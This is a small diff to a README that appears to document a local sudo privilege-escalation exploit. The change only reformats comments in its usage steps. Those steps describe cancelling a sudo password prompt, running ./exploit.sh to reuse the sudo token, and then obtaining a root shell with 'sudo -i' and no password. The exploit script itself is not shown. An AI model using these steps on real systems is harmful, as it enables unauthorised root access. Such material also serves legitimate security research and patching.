@@ -5,8 +5,8 @@
 ## How to use
 ```sh
 $ sudo whatever
-[sudo] password for user: // Send <ctrl>+c since you don't have the password). // This creates an invalid sudo tokens.
-$ ./exploit.sh // This activates our sudo token.
+[sudo] password for user:    # Send <ctrl>+c since you don't have the password). # This creates an invalid sudo tokens.
+$ ./exploit.sh # This activates our sudo token.
 .... wait 3 seconds
 $ sudo -i # no password required :)
 # uid=0(root) gid=0(root) groups=0(root)
